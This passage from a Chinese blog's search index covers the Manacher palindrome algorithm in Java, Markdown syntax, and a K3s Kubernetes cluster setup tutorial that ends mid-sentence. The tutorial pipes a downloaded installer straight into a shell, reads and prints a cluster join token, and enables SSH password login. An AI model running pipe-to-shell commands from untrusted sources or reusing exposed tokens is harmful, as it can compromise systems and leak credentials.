即i在R内。分为\ni’的回文半径在R-L内，那么i的回文半径也和i’相同\ni’的回文半径在R-L上，i的回文半径和i’相同，但后面还要继续比较，i的回文半径可能会变大。\ni’的回文半径在R-L外，和上面一样，也需要往后比。(图就不放了，可以参考上面的图，但红线得划到L和R外)\n\n\n\nManacher算法实际是利用了回文的特性，即回文中的回文不需要再重复比较，由回文的特性可以跳过已经比较过的（即跳过半径数组中的长度）\nManacher实现：\npackage LongestPalindromicSubstring;public class Manacher &#123;    public static int Manacher(String str) &#123;        int len = str.length() * 2 + 1;        char[] string = new char[len];        char[] str1 = str.toCharArray();        int index = 0;        // 将字符串中添加特殊字符，让字符串只有奇回文        for (int i = 0; i &lt; len; i++) &#123;            string[i] = (i % 2) == 0 ? &#x27;#&#x27; : str1[index++];        &#125;        // 记录回文半径的数组        int[] p = new int[len];        // r最右回文右边界，c对应的最左回文中心，maxn最大回文半径        int r = -1;        int c = -1;        int maxn = Integer.MIN_VALUE;        // 从左往右遍历        for (int i = 0; i &lt; len; i++) &#123;            // i&gt;r 时，回文半径为1，否则回文半径就是 i对应i‘的回文半径 或者 i到r的距离            p[i] = r &gt; i ? Math.min(r - i, p[2 * c - i]) : 1;            while (i + p[i] &lt; len &amp;&amp; i - p[i] &gt; -1) &#123;                if (string[i + p[i]] == string[i - p[i]]) &#123;                    p[i]++;                &#125; else &#123;                    break;                &#125;            &#125;            // 判断r和c是否可以更新            if (i + p[i] &gt; r) &#123;                r = i + p[i];                c = i;            &#125;            // 更新最大回文半径            maxn = Math.max(maxn, p[i]);        &#125;        return maxn - 1;    &#125;&#125;\n\n总结参考文章：\n字符串匹配KMP算法详解四种最常见的字符串匹配算法概述马拉车算法（Manacher’s Algorithm）最长回文子串的五种求法(暴力、中点扩散、DP、hash+二分、Manacher)\n","categories":["学习笔记"],"tags":["字符串","模式匹配","回文"]},{"title":"Markdown语法","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Markdown%E8%AF%AD%E6%B3%95/","content":"关于MarkdownMarkdown 是轻量级的标记语言，可用于在纯文本文档中添加格式化元素。Markdown 由 John Gruber 于 2004 年创建。专注于文字内容纯文本，方便读写，且兼容性良好语法简单，学习成本低不适用于对排版要求高的场景\nMarkdown的工作原理在使用 Markdown 格式书写时，文本内容存储在 .md 或 .markdown 拓展名的纯文本文件中。Markdown 应用程序使用一种称为 Markdown 处理器（也通常称为“解析器”或“实现”）的东西将获取到的 Markdown 格式的文本输出为 HTML 格式。这时，便可以在 Web 浏览器中查看这篇文档。所以 Markdown 语法是兼容 HTML 语言的，所以在 Markdown 中可以直接使用 HTML 标签，来实现各种样式。比如下文 4.4 中下划线的实现便使用了&lt;u&gt;标签\n标题底线表示一级标题===二级标题---\n\n效果如图：说明：\n\n底线是=表示一级标题\n底线是-表示二级标题\n底线符号至少2个才可以表示标题\n这种语法只支持这两级标题\n\n#表示# 一级标题## 二级标题### 三级标题#### 四级标题##### 五级标题###### 六级标题\n\n效果如图：说明：\n\n在行首插入#可标记标题\n#的个数表示标题的等级\n建议在#后加一个空格\nMarkdown最多支持前六级标题\n\n建议\n使用#标记标题，而不是===或者---，因为后者不便于阅读和理解，不简洁明了。\n保持间距，标题前后空一行，#与文本间也空一格。\n不要有多余的空格，标题开头和结尾不要有多余的空格\n标题的结尾不要有标点符号\n标题要简短\n\n段落格式段落行与行之间没有空行（什么都没有，或者只有空格和制表符），将会被视为同一段落。有空行则会被视为不同段落。段内换行，在行末添加2个或以上空格。\n字体*斜体文本*_斜体文本_**粗体文本**__粗体文本__***粗斜体文本***___粗斜体文本___\n\n效果如图：\n建议\n\n粗体使用**包裹，斜体使用*包裹\n语法标记内不要有空格。\n\n分割线**** * ******- - -____ _ _\n\n效果如图：（本分割线有主题样式，并非Markdown原生）说明：\n\n分割线使用3个或以上的*或-或_标记\n行内不能有其他字符，除了空格。\n\n删除线 和 下划线~~删除线~~&lt;u&gt;下划线&lt;/u&gt;\n\n效果如图：\n列表无序列表## 使用** 第一项* 第二项* 第三项## 使用++ 第一项+ 第二项+ 第三项## 使用-- 第一项- 第二项- 第三项\n\n效果如图：\n有序列表1. 第一项2. 第二项3. 第三项\n\n效果如图：\n列表嵌套1. 一层列表    * 二层列表        1. 三层列表            * 四层列表\n\n效果如图：\n区块&gt; 大佬说过的话&gt;&gt; 第一点！&gt;&gt;&gt; 认真听！&gt; 区块中使用列表&gt; 1. 第一项&gt; 2. 第二项&gt; * 第一项&gt; * 第二项* 列表中使用区块  &gt; 第一项  &gt; 第二项* 第二项\n\n效果如图：（这里区块样式也并非Markdown原生）\n图片![文本](图片链接)\n\n效果…上文中所以引用图片就是效果。说明：\n\n图片链接，可以是本地图片，也可以是网络图片。\n本地图片可以使用相对路径，也可以使用绝对路径。（建议使用相对路径，当项目迁移时，文档不会加载不出图片。当然，这得建立在有一个好地整理习惯的前提下）\n\n链接[文本](链接)[博客首页](https://2450123.github.io)&lt;链接&gt;&lt;https://2450123.github.io&gt;这是[引用链接]。[引用链接]: https://2450123.github.io\n\n效果如下：博客首页https://2450123.github.io引用链接这里用不了，所以不做演示。它相当于定义了一个变量，可以重复引用。说明：\n\n网络链接要写全，比如 https://2450123.github.io ，否则会被识别问本地地址。\n定义的链接可以放在文件任意位置，建议放在文末。\n引用链接不区分大小写\n链接标记可以有数字、字母、空格和标点。\n\n表格| 左对齐 | 右对齐 | 居中对齐 || :-----| ----: | :----: || 单元格 | 单元格 | 单元格 || 单元格 | 单元格 | 单元格 |\n\n效果如下：\n\n\n\n左对齐\n右对齐\n居中对齐\n\n\n\n单元格\n单元格\n单元格\n\n\n单元格\n单元格\n单元格\n\n\n说明：\n\n\n\n\n\n使用 | 来分隔不同的单元格，使用 - 来分隔表头和其他行。\n-: 设置内容和标题栏居右对齐。\n:- 设置内容和标题栏居左对齐。\n:-: 设置内容和标题栏居中对齐。\n\n代码这是代码块\n\n这是行内代码说明：\n\n代码块使用 ~~~ 包裹\n行内代码使用 ` 包裹\n\n总结写这篇的本意是让刚开始使用Markdown的我熟悉一下Markdown的语法格式，更加熟练的使用他来写博客。我在这里列出了他的基础语法，他还有很多插件，可以实现各种各样的功能，比如数学公式和注脚等等。但是Markdown的开发者John Gruber说：\n\nMarkdown 格式化语法设计的目的就是为了易读，而且 Markdown 应该可以直接使用纯文本进行发布，无需标签或者是一些格式化命令。\n\n简单来说，Markdown就是为了让我们专注于内容，而不是关注他的排版。所以，我觉得如果过于在意他的语法，有些买椟还珠的意味。所以本篇就列举一些基础的语法，其他高阶的用法就不罗列了。这里也是为了方便我后续来看，不过还是那句话，应该注重内容，而不是排版。\n","categories":["学习笔记"],"tags":["markdown"]},{"title":"Kubernetes本地环境搭建及应用部署","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Kubernetes%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/","content":"基础环境准备（可选）虚拟机配置基础环境这里选择 multipass 虚拟机。（但只是使用它创建虚拟机）当然，如果有真实物理机，并且他们网络是直通的，那可以省去很多配置的麻烦。这里大部分关于虚拟机的配置应该都可以省略。但很可惜，我并没有那么多机器或者云服务器。但好在我的电脑（windows11）内存有64G，足够我随意的折腾。\n创建三台虚拟机（一主二从）\nmultipass launch --name=master --cpus=2 --m=4096MiB -d 20G 24.04multipass launch --name=worker1 --cpus=2 --m=4096MiB -d 20G 24.04multipass launch --name=worker2 --cpus=2 --m=4096MiB -d 20G 24.04\n\n基础网络配置（固定ip配置）这里我需要为每台虚拟机都设置一个固定ip，防止机器重启后ip会发生变化，导致需要频繁改一些配置。Multipass 默认通过 NAT 网络 + DHCP 动态分配 IP将宿主机ip固定为192.168.1.5master 节点的ip为 192.168.1.10worker1 节点的ip为 192.168.1.11worker2 节点的ip为 192.168.1.12\n这里以 master 节点为例，展示配置过程。\n首先打开Hyper-V 管理器，右侧虚拟交换机管理器，新建虚拟交换机。如下图：\n保存之后，来到网络适配器，为刚创建的虚拟交换机设置一个固定的ip。\n修改/etc/netplan/50-cloud-init.yaml：\nnetwork:  version: 2  ethernets:    eth0:      dhcp4: no      addresses: [ 192.168.1.10/24 ]      routes:        - to: default          via: 192.168.1.1      nameservers:        addresses: [ 192.168.1.1 ]\n\n应用更改并验证\n# 应用更改sudo netplan apply# 应用更改sudo netplan --debug apply# 检查 IP 是否生效ip a show eth0# 测试网络连通性ping 192.168.1.1\n\n输出如下：\nubuntu@master:/etc/netplan$ ip a show eth02: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000    link/ether 52:54:00:29:3e:e9 brd ff:ff:ff:ff:ff:ff    inet 192.168.1.10/24 brd 192.168.1.255 scope global eth0       valid_lft forever preferred_lft forever    inet6 2409:8a20:2a0:6c60:5054:ff:fe29:3ee9/64 scope global dynamic mngtmpaddr noprefixroute       valid_lft 198387sec preferred_lft 111987sec    inet6 fe80::5054:ff:fe29:3ee9/64 scope link       valid_lft forever preferred_lft foreverubuntu@master:/etc/netplan$ ping 192.168.1.1PING 192.168.1.1 (192.168.1.1) 56(84) bytes of data.64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=7.33 ms64 bytes from 192.168.1.1: icmp_seq=2 ttl=64 time=3.45 ms64 bytes from 192.168.1.1: icmp_seq=3 ttl=64 time=3.77 ms64 bytes from 192.168.1.1: icmp_seq=4 ttl=64 time=4.16 ms^C--- 192.168.1.1 ping statistics ---4 packets transmitted, 4 received, 0% packet loss, time 3006msrtt min/avg/max/mdev = 3.449/4.675/7.326/1.550 ms\n\n配置域名在三台虚拟机的 /etc/hosts 文件末尾添加：\n192.168.1.10 master192.168.1.11 worker1192.168.1.12 worker2\n\n配置ssh登录这里配置ssh密码登录，以方便外部宿主机连接使用。（因为修改为固定ip后，multipass将无法连接到虚拟机）\n设置密码：\nsudo passwd ubuntu\n\n修改/etc/ssh/sshd_config配置中的以下内容：\n# 是否允许使用密码登录 SSHPasswordAuthentication yes# 是否允许使用公钥认证登录 SSHPubkeyAuthentication yes# 是否启用 PAM（Pluggable Authentication Modules，可插拔认证模块）UsePAM no\n\n\n注意：是否包含Include /etc/ssh/sshd_config.d/*.conf配置它支持包含其他配置文件，从而实现配置的模块化和可维护性。所有配置会合并，顺序按文件名排序加载，后加载的内容会覆盖前面的设置。\n\n重启 ssh 服务应用更改后，就可以在宿主机使用配好的固定ip进行ssh登录了：\nsudo systemctl restart ssh\n\n配置全局代理Linux中，设置全系统代理（包括 GUI 图形界面 + CLI），需要修改/etc/environment文件；仅为 shell 用户（终端）设置代理，需要修改/etc/profile文件；为单用户设置代理，需要修改~/.bashrc文件。\n/etc/environment文件添加：\nhttp_proxy=&quot;http://192.168.1.5:7890&quot;https_proxy=&quot;http://192.168.1.5:7890&quot;all_proxy=&quot;socks5://192.168.1.5:7890&quot;no_proxy=&quot;localhost,127.0.0.1,::1&quot;\n\n重启应用更改。\n/etc/profile或者~/.bashrc文件添加：\nexport http_proxy=http://192.168.1.5:7890export https_proxy=http://192.168.1.5:7890export all_proxy=socks5://192.168.1.5:7890export no_proxy=&quot;localhost,127.0.0.1,::1&quot;\n\nsource /etc/profile或者source ~/.bashrc应用更改。\n取消代理：unset http_proxy https_proxy all_proxy\n验证代理是否生效，可以使用curl -v https://www.google.com会返回包含类似Connected to 192.168.1.5 (192.168.1.5) port 7890的内容，如下（上述命令返回过长，这里以本地服务为例）：\nubuntu@master:~$ curl -v http://192.168.1.5:8000/api/user/v1/helloworld/ubuntu* Uses proxy env variable no_proxy == &#x27;localhost,127.0.0.1,::1&#x27;* Uses proxy env variable http_proxy == &#x27;http://192.168.1.5:7890&#x27;*   Trying 192.168.1.5:7890...* Connected to 192.168.1.5 (192.168.1.5) port 7890&gt; GET http://192.168.1.5:8000/api/user/v1/helloworld/ubuntu HTTP/1.1&gt; Host: 192.168.1.5:8000&gt; User-Agent: curl/8.5.0&gt; Accept: */*&gt; Proxy-Connection: Keep-Alive&gt;&lt; HTTP/1.1 200 OK&lt; Content-Length: 26&lt; Connection: keep-alive&lt; Content-Type: application/json&lt; Date: Wed, 23 Apr 2025 15:34:03 GMT&lt; Keep-Alive: timeout=4&lt; Proxy-Connection: keep-alive&lt;* Connection #0 to host 192.168.1.5 left intact&#123;&quot;message&quot;:&quot;Hello ubuntu&quot;&#125;\n\nkubernetes 环境搭建部署 Server这里使用 K3s - 轻量级 Kubernetes 部署。与 Kubernetes 不同，这里的 Master 节点叫 Server 节点，而 Slave 节点叫 Agent 节点。\n部署 Server 节点 curl -sfL https://get.k3s.io | sh -\nubuntu@master:~$ curl -sfL https://get.k3s.io | sh -[INFO]  Finding release for channel stable[INFO]  Using v1.32.3+k3s1 as release[INFO]  Downloading hash https://github.com/k3s-io/k3s/releases/download/v1.32.3+k3s1/sha256sum-amd64.txt[INFO]  Downloading binary https://github.com/k3s-io/k3s/releases/download/v1.32.3+k3s1/k3s[INFO]  Verifying binary download[INFO]  Installing k3s to /usr/local/bin/k3s[INFO]  Skipping installation of SELinux RPM[INFO]  Creating /usr/local/bin/kubectl symlink to k3s[INFO]  Creating /usr/local/bin/crictl symlink to k3s[INFO]  Creating /usr/local/bin/ctr symlink to k3s[INFO]  Creating killall script /usr/local/bin/k3s-killall.sh[INFO]  Creating uninstall script /usr/local/bin/k3s-uninstall.sh[INFO]  env: Creating environment file /etc/systemd/system/k3s.service.env[INFO]  systemd: Creating service file /etc/systemd/system/k3s.service[INFO]  systemd: Enabling k3s unitCreated symlink /etc/systemd/system/multi-user.target.wants/k3s.service → /etc/systemd/system/k3s.service.[INFO]  systemd: Starting k3s\n\n查看节点运行状态kubectl get node：\nubuntu@master:~$ sudo kubectl get nodeNAME     STATUS   ROLES                  AGE   VERSIONmaster   Ready    control-plane,master   78s   v1.32.3+k3s1\n\n获取 node-token cat /var/lib/rancher/k3s/server/node-token 在部署 Agent 节点的时候需要用到：\nubuntu@master:~$ sudo cat /var/lib/rancher/k3s/server/node-tokenK104869223bb6e5c3c1bb95bc7dcc505cb2d5576cf2253e9bd0df1b3a7852f91397::server:368a64fba85ad0718fe841967df1717f\n\n部署 Agent部署 Agent 节点 curl -sfL https://get.k3s.io | K3S_URL=https://server:6443 K3S_TOKEN=token sh -\nubuntu@worker1:~$ curl -sfL https://get.k3s.io | K3S_URL=https://master:6443 K3S_TOKEN=K104869223bb6e5c3c1bb95bc7dcc505cb2d5576cf2253e9bd0df1b3a7852f91397::server:368a64fba85ad0718fe841967df1717f sh -[INFO]  Finding release for channel stable[INFO]  Using v1.32.3+k3s1 as release[INFO]  Downloading hash https://github.com/k3s-io/k3s/releases/download/v1.32.3+k3s1/sha256sum-amd64.txt[INFO]  Downloading binary https://github.com/k3s-io/k3s/releases/download/v1.32.3+k3s1/k3s[INFO]  Verifying binary download[INFO]  Installing k3s to /usr/local/bin/k3s[INFO]  Skipping installation of SELinux RPM[INFO]  Creating /usr/local/bin/kubectl symlink to k3s[INFO]  Creating /usr/local/bin/crictl symlink to k3s[INFO]  Creating /usr/local/bin/ctr symlink to k3s[INFO]  Creating killall script /usr/local/bin/k3s-killall.sh[INFO]  Creating uninstall script /usr/local/bin/k3s-agent-uninstall.sh[INFO]  env: Creating environment file /etc/systemd/system/k3s-agent.service.env[INFO]  systemd: Creating service file /etc/systemd/system/k3s-agent.service[INFO]  systemd: Enabling k3s-agent unitCreated symlink /etc/systemd/system/multi-user.target.wants/k3s-agent.service → /etc/systemd/system/k3s-agent.service.[INFO]  systemd: Starting k3s-agent\n\n节点都部署完后，节点状态如下：\nubuntu@master:~$ sudo kubectl get nodeNAME      STATUS   ROLES                  AGE   VERSIONmaster    Ready    control-plane,master   18m   v1.32.3+k3s1worker1   Ready    &lt;none&gt;                 29s   v1.32.3+k3s1worker2   Ready    &lt;none&gt;                 5s    v1.32.3+k3s1\n\n设置 K3S_URL 参数会使 K3s 以 worker 模式运行。 K3s agent 会在所提供的 URL 上向监听的 K3s 服务器注册。\n到这里，Kubernetes 环境搭建完成。\n创建 Deployment创建nginx-deployment.yaml：\n# 定义 Deployment 基本信息metadata.name: 给这个 Deployment 起个名字。apiVersion: apps/v1 # Deployment 所使用的 API 版本，K8s 1.9+ 都是 apps/v1。kind: Deployment # 资源类型是 Deployment。metadata:  name: nginx # Deployment 的名字。# 定义副本数量和 Pod 选择器spec:  replicas: 2 # 创建副本数量  selector:    matchLabels:      app: nginx # Deployment 会管理所有 带有标签 app=nginx 的 Pod。它必须和后面的模板里的 labels 保持一致。  # 定义 Pod 模板（template）  template:    metadata:      labels:        app: nginx # 为 Pod 打上 app=nginx 标签，方便 selector 识别。    # 定义容器信息    spec:      containers:        - name: nginx # 容器名称          image: nginx:latest # 镜像名称          ports:            - containerPort: 80 # 容器端口\n\n使用 kubectl apply 命令创建 Deployment：\nubuntu@master:~/apps$ sudo kubectl apply -f nginx-deployment.yamldeployment.apps/nginx created\n\n使用kubectl get deployment查看运行状态，使用kubectl get pods查看 Pod 状态：\nubuntu@master:~/apps$ sudo kubectl get deploymentNAME    READY   UP-TO-DATE   AVAILABLE   AGEnginx   2/2     2            2           17subuntu@master:~/apps$ sudo kubectl get pods -l app=nginxNAME                   READY   STATUS    RESTARTS   AGEnginx-96b9d695-gfjvq   1/1     Running   0          25snginx-96b9d695-w5qxx   1/1     Running   0          25s\n\n可以看到 Deployment 创建 Pod 的命名规则：${DeploymentName}-${DeploymentUid}-${Hash}。\n使用 kubectl get pod -o wide 查看 Pod 运行状态和 IP 地址，可以看到 nginx 被创建了两个 Pod 副本，分别部署在了 worker1 和 worker2 上面：\nubuntu@master:~/apps$ sudo kubectl get pod -o wideNAME                   READY   STATUS    RESTARTS   AGE     IP          NODE      NOMINATED NODE   READINESS GATESnginx-96b9d695-gfjvq   1/1     Running   0          8m42s   10.42.2.3   worker2   &lt;none&gt;           &lt;none&gt;nginx-96b9d695-w5qxx   1/1     Running   0          8m42s   10.42.1.3   worker1   &lt;none&gt;           &lt;none&gt;\n\n此时的 nginx 还不能被外部访问，他们的 IP 是 Cluster 的内部私有 IP，只能在集群内部访问。并且这些 IP 是浮动的，Pod 重启后，IP 也会变化。这时就需要创建 Service 来解决这个问题。\n创建 ServiceService 是 Kubernetes 中一种网络抽象，用于为一组 Pod 提供统一访问入口。简单来说，Pod 是会变化的（比如被删除、替换），而 Service 提供一个 固定 IP &#x2F; 名称 &#x2F; 端口，始终指向一组后端 Pod。\napiVersion: v1 # 使用 v1 API，Service 资源的标准版本kind: Service # 声明该资源类型为 Servicemetadata:  name: nginx-service # Service 的名字，供集群中引用、DNS 名称生成等使用spec:  type: NodePort  # 设置 Service 类型为 NodePort，支持通过任意节点的 IP + nodePort 端口访问服务  selector:    app: nginx    # 选择所有标签为 app=nginx 的 Pod  ports:    - port: 80         # Service 自己监听的端口，供集群内其他 Pod 调用这个服务时使用      targetPort: 80   # 转发到后端 Pod 的哪个端口（nginx 监听的端口）      nodePort: 30080  # 外部访问时的端口（可不写，系统会自动分配 30000~32767）\n\n使用 kubectl apply 命令创建 Service，使用 kubectl get service 查看运行状态：\nubuntu@master:~/apps/nginx$ sudo kubectl apply -f nginx-service.yamlservice/nginx-service createdubuntu@master:~/apps/nginx$ sudo kubectl get serviceNAME            TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)        AGEkubernetes      ClusterIP   10.43.0.1       &lt;none&gt;        443/TCP        72mnginx-service   NodePort    10.43.119.114   &lt;none&gt;        80:30080/TCP   2m57s\n\n到这里，已经可以使用节点 node 外部的 IP + nodePort 访问到 nginx 了。但是，访问 nginx 的时候，IP 是 node 的 IP，没有一个统一的入口。\n配置应用打包流程经过上面 nginx 部署的测试，现在k8s集群已经是可用状态了。下面要将本地编写的应用打包为镜像，并上传到镜像仓库，再通过 yaml 配置部署到 k8s 集群中。\n这里使用的本地项目使用 go-kratos 构建的微服务项目。这是一个大仓项目，目录结构如下：\nBBS├── .github├── app│   ├── backend│   │   ├── common│   │   │   ├── api│   │   │   │   ├── common│   │   │   │   │   ├── v1│   │   │   │   │   │   ├── error_reason.pb.go│   │   │   │   │   │   └── error_reason.proto│   │   │   │   ├── user│   │   │   │   │   ├── v1│   │   │   │   │   │   ├── demo.pb.go│   │   │   │   │   │   ├── demo.proto│   │   │   │   │   │   ├── demo_grpc.pb.go│   │   │   │   │   │   └── demo_http.pb.go│   │   │   ├── third_party│   │   ├── user│   │   │   ├── cmd│   │   │   │   ├── user│   │   │   │   │   ├── main.go│   │   │   │   │   ├── wire.go│   │   │   │   │   └── wire_gen.go│   │   │   ├── configs│   │   │   │   ├── config.yaml│   │   │   ├── internal│   │   │   ├── Dockerfile│   │   │   ├── Makefile│   │   ├── go.mod│   │   ├── go.sum│   │   ├── openapi.yaml│   ├── frontend└── ...\n\n基于这个目录结构，来修改 应用构建文件Makefile、Docker镜像构建文件Dockerfile、github action 文件user-build.yaml。\n首先是 Makefile 文件：\n# 全局变量定义GOHOSTOS := $(shell go env GOHOSTOS)GOPATH := $(shell go env GOPATH)VERSION := latest# 项目目录结构定义 - 使用更可靠的路径获取方式ROOT_DIR := $(realpath $(dir $(lastword $(MAKEFILE_LIST)))/..)COMMON_DIR := $(ROOT_DIR)/commonUSER_DIR := $(ROOT_DIR)/userAPI_DIR := $(COMMON_DIR)/apiTHIRD_PARTY_DIR := $(COMMON_DIR)/third_partyINTERNAL_DIR := $(ROOT_DIR)/user/internal# 根据操作系统设置查找命令ifeq ($(GOHOSTOS), windows)    Git_Bash := $(subst \\,/,$(subst cmd\\,bin\\bash.exe,$(dir $(shell where git))))    FIND_CMD := $(Git_Bash) -c &quot;find&quot;else    FIND_CMD := findendif# Proto 文件查找INTERNAL_PROTO_FILES := $(shell $(FIND_CMD) $(INTERNAL_DIR) -name &#x27;*.proto&#x27; 2&gt;/dev/null)API_PROTO_FILES := $(shell $(FIND_CMD) $(API_DIR) -name &#x27;*.proto&#x27; 2&gt;/dev/null)## 工具安装.PHONY: initinit:\t@echo &quot;Installing required tools...&quot;\tgo install google.golang.org/protobuf/cmd/protoc-gen-go@latest\tgo install google.golang.org/grpc/cmd/protoc-gen-go-grpc@latest\tgo install github.com/go-kratos/kratos/cmd/kratos/v2@latest\tgo install github.com/go-kratos/kratos/cmd/protoc-gen-go-http/v2@latest\tgo install github.com/google/gnostic/cmd/protoc-gen-openapi@latest\tgo install github.com/google/wire/cmd/wire@latest## 内部 Proto 生成.PHONY: configconfig:\t@echo &quot;Generating internal protobuf files...&quot;\t@test -n &quot;$(INTERNAL_PROTO_FILES)&quot; || (echo &quot;No proto files found in $(INTERNAL_DIR)&quot; &amp;&amp; exit 1)\tprotoc --proto_path=$(INTERNAL_DIR) \\\t       --proto_path=$(THIRD_PARTY_DIR) \\\t       --go_out=paths=source_relative:$(INTERNAL_DIR) \\\t       $(INTERNAL_PROTO_FILES)## API Proto 生成.PHONY: apiapi:\t@echo &quot;Generating API protobuf files...&quot;\t@test -n &quot;$(API_PROTO_FILES)&quot; || (echo &quot;No proto files found in $(API_DIR)&quot; &amp;&amp; exit 1)\tprotoc --proto_path=$(API_DIR) \\\t       --proto_path=$(THIRD_PARTY_DIR) \\\t       --go_out=paths=source_relative:$(API_DIR) \\\t       --go-http_out=paths=source_relative:$(API_DIR) \\\t       --go-grpc_out=paths=source_relative:$(API_DIR) \\\t       --openapi_out=fq_schema_naming=true,default_response=false:$(API_DIR) \\\t       $(API_PROTO_FILES)## 构建应用.PHONY: buildbuild:\t@echo &quot;Building application...&quot;\t@mkdir -p $(ROOT_DIR)/bin/\t@cd $(USER_DIR) &amp;&amp; \\\tgo build -ldflags &quot;-X main.Version=$(VERSION)&quot; -o $(ROOT_DIR)/bin/server ./cmd/user/...\t@echo &quot;Output binary: $(ROOT_DIR)/bin/server&quot;## 代码生成.PHONY: generategenerate:\t@echo &quot;Generating code...&quot;\t@cd $(USER_DIR) &amp;&amp; \\\tgo generate ./... &amp;&amp; \\\tgo mod tidy## 执行全部任务.PHONY: allall: init api config build generate\n\n这里的 VERSION 暂时选择写死了，正常会通过 VERSION := $(shell git describe --tags --always) git 命令来获取最新的标签（tag）或提交哈希（commit hash）。\n然后是 DockerFile 文件：\n# 第一阶段：构建Go应用FROM golang:1.23 as builderWORKDIR /build# 复制 go.mod 和 go.sum，提前拉依赖COPY go.mod go.sum ./RUN go mod download# 复制 user 和 common 源码COPY user/ ./user/COPY common/ ./common/# 进入 user 目录进行构建WORKDIR /build/user# 编译RUN make init &amp;&amp; make generate &amp;&amp; make build# 第二阶段：制作小体积运行环境FROM debian:stable-slimRUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \\    ca-certificates netbase &amp;&amp; \\    rm -rf /var/lib/apt/lists/*# 把可执行文件拷贝进来COPY --from=builder /build/bin/ /app/COPY --from=builder /build/user/configs/ /app/configs/WORKDIR /appEXPOSE 8000 9000CMD [&quot;/app/server&quot;, &quot;-conf&quot;, &quot;/app/configs/config.yaml&quot;]\n\n最后是 github action 文件：\nname: Docker Build and Push for Go User Appon:  workflow_dispatch:jobs:  build-and-push:    runs-on: ubuntu-latest    steps:      # Step 1: Checkout the code      - name: Checkout Code        uses: actions/checkout@v4      # Step 2: Set up Go environment + cache      - name: Set up Go        uses: actions/setup-go@v5        with:          go-version: &#x27;1.23&#x27;      - name: Cache Go Modules        uses: actions/cache@v4        with:          path: |            ~/.cache/go-build            ~/go/pkg/mod          key: $&#123;&#123; runner.os &#125;&#125;-go-$&#123;&#123; hashFiles(&#x27;**/go.sum&#x27;) &#125;&#125;          restore-keys: |            $&#123;&#123; runner.os &#125;&#125;-go-      # Step 3: Install protoc      - name: Install Protobuf Compiler        run: |          sudo apt-get update          sudo apt-get install -y protobuf-compiler          protoc --version      # Step 4: Docker Login      - name: Docker Login        uses: docker/login-action@v3        with:          registry: registry.cn-hangzhou.aliyuncs.com          username: $&#123;&#123; secrets.DOCKER_USERNAME &#125;&#125;          password: $&#123;&#123; secrets.DOCKER_PASSWORD &#125;&#125;      # Step 5: Build and Push Docker Image      - name: Build and Push Docker Image        uses: docker/build-push-action@v5        with:          context: app/backend          file: app/backend/user/Dockerfile          push: true          tags: |            registry.cn-hangzhou.aliyuncs.com/docker-learn-cooooing/user:latest\n\n其中 secrets.DOCKER_USERNAME 和 secrets.DOCKER_PASSWORD 是 GitHub Secrets，需要在项目设置中配置，用于登录阿里的镜像仓库。目前配置的是手动触发，后续可修改为 push 或者 release 时触发。自动构建最新的镜像推送到阿里的镜像仓库。\n最后回到 kubernetes ，通过 yaml 文件创建 deployment：\napiVersion: apps/v1kind: Deploymentmetadata:  name: user-service  labels:    app: user-servicespec:  replicas: 2  selector:    matchLabels:      app: user-service  template:    metadata:      labels:        app: user-service    spec:      imagePullSecrets:        - name: aliyun-registry-secret      containers:        - name: user          image: registry.cn-hangzhou.aliyuncs.com/docker-learn-cooooing/user:latest          ports:            - containerPort: 8000            - containerPort: 9000          volumeMounts:            - name: config-volume              mountPath: /data/conf          resources:            limits:              cpu: &quot;500m&quot;              memory: &quot;512Mi&quot;            requests:              cpu: &quot;100m&quot;              memory: &quot;128Mi&quot;#          readinessProbe: # 就绪探针，确保容器准备好才流量转发#            httpGet:#              path: /healthz#              port: 8000#            initialDelaySeconds: 5#            periodSeconds: 10#          livenessProbe: # 存活探针，崩了自动重启#            httpGet:#              path: /healthz#              port: 8000#            initialDelaySeconds: 15#            periodSeconds: 20      volumes:        - name: config-volume          emptyDir: &#123; &#125; # 这里可以替换成挂载 ConfigMap---apiVersion: v1kind: Servicemetadata:  name: user-servicespec:  selector:    app: user-service  ports:    - name: http      port: 8000      targetPort: 8000    - name: grpc      port: 9000      targetPort: 9000  type: ClusterIP\n\n它会从阿里镜像仓库拉取镜像，并创建 pod 和 service。其中关于探针的部分被注释掉了，探针（Probes）是一种用于检测容器健康状况的机制。探针允许Kubernetes定期检查容器是否仍在运行并且按预期工作。根据探针的检查结果，Kubernetes可以决定是否需要重启容器或者进行其他操作。探针需要服务实现一个HTTP端点，Kubernetes 将定期对这个端点发送GET请求。如果端点返回一个成功的状态码（通常是200-399范围内），Kubernetes就会认为容器是健康的。\n这里 service 并没有配置 NodePort，所以目前服务只暴露在 Kubernetes 集群内部，外部访问需要通过 ingress 配置。\n配置 HelmHelm 是 Kubernetes 的包管理器。安装过程参考Helm 文档，这里省略。\nHelm 默认会访问 localhost 的 8080 端口，但是这里使用 k3s，默认的 API Server 地址和端口通常是https://&lt;K3S_SERVER_IP&gt;:6443，所以访问 localhost 的 8080 端口会报错：Error: INSTALLATION FAILED: Kubernetes cluster unreachable: Get &quot;http://localhost:8080/version&quot;: dial tcp [::1]:8080: connect: connection refused所以需要一些设置：\nHelm 默认会读取 ~/.kube/config 文件，但 K3s 的 kubeconfig 默认存储在 /etc/rancher/k3s/k3s.yaml，需要复制到本地并设置权限：\nmkdir -p ~/.kubesudo cp /etc/rancher/k3s/k3s.yaml ~/.kube/configsudo chown $USER ~/.kube/config\n\n使用 helm ls --all-namespaces 测试 Helm 是否能访问 K3s：\nubuntu@master:~$ helm ls --all-namespacesNAME            NAMESPACE       REVISION        UPDATED                                 STATUS          CHART                           APP VERSIONtraefik         kube-system     1               2025-04-25 08:22:17.95057216 +0000 UTC  deployed        traefik-34.2.1+up34.2.0         v3.3.2     traefik-crd     kube-system     1               2025-04-25 08:22:02.482297704 +0000 UTC deployed        traefik-crd-34.2.1+up34.2.0     v3.3.2     \n\n创建 Ingress使用 Kubernetes 的 Ingress 